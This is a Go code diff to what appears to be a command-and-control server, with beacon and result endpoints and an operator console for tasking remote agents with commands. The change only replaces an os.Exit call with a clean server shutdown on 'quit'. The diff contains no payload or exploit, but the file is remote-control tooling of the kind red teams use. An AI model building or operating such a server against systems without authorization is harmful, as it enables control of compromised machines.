@@ -53,8 +53,8 @@ func Run() error {
 	mux.HandleFunc("/beacon", handleBeacon)
 	mux.HandleFunc("/result", handleResult)
 
-	// Admin console runs in goroutine
-	go adminConsole(port)
+	quit := make(chan struct{})
+	go adminConsole(quit)
 
 	localIP := getLocalIP()
 	fmt.Println()
@@ -67,7 +67,17 @@ func Run() error {
 		Addr:    ":" + port,
 		Handler: mux,
 	}
-	return srv.ListenAndServe()
+
+	go func() {
+		<-quit
+		srv.Close()
+	}()
+
+	err := srv.ListenAndServe()
+	if err == http.ErrServerClosed {
+		return nil
+	}
+	return err
 }
 
 func handleBeacon(w http.ResponseWriter, r *http.Request) {
@@ -155,7 +165,7 @@ func handleResult(w http.ResponseWriter, r *http.Request) {
 	w.WriteHeader(http.StatusOK)
 }
 
-func adminConsole(port string) {
+func adminConsole(quit chan struct{}) {
 	time.Sleep(500 * time.Millisecond)
 	fmt.Println()
 	ui.Info("Admin console active. Commands: list, task <id> <cmd>, results <id>, quit")
@@ -219,7 +229,9 @@ func adminConsole(port string) {
 			}
 			mu.Unlock()
 		case "quit", "exit":
-			os.Exit(0)
+			ui.Info("Shutting down C2 server...")
+			close(quit)
+			return
 		default:
 			ui.Warn("Unknown command. Use: list, task, results, quit")
 		}
